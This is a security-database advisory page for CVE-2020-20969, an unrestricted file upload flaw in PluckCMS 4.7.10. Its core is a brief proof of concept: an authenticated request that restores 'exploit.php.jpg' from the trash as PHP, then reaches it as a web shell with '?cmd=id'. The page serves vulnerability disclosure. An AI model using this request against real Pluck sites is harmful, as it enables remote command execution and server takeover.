---
title: PluckCMS 4.7.10 Unrestricted File Upload
url: https://cxsecurity.com/issue/WLB-2026030016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-08
fetch_date: 2026-03-09T04:08:01.220091
---

# PluckCMS 4.7.10 Unrestricted File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PluckCMS 4.7.10 Unrestricted File Upload** **2026.03.08**  Credit:  **[CodeSecLab](https://cxsecurity.com/author/CodeSecLab/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2020-20969](https://cxsecurity.com/cveshow/CVE-2020-20969/ "Click to see CVE-2020-20969")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: PluckCMS 4.7.10 - Unrestricted File Upload
# Date: 2025-11-25
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/pluck-cms/pluck/
# Software Link: https://github.com/pluck-cms/pluck/
# Version: 4.7.10
# Tested on: Windows
# CVE : CVE-2020-20969
Proof Of Concept
GET /admin.php?action=trash\_restoreitem&var1=exploit.php.jpg&var2=file HTTP/1.1
Host: pluck
Cookie: PHPSESSID=[valid\_session\_id]
\*\*Access Method:\*\*
http://pluck/files/exploit\_copy.php?cmd=id
\*\*Additional Conditions:\*\*
1. Valid session cookie required (authenticated attack)
2. File `exploit.php.jpg` must exist in `data/trash/files/` before restoration
3. Server must not filter double extensions during file upload/trash operations
Steps to Reproduce
Log in as an admin user.
Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie.
The file will be restored and can be accessed through the url.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030016)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top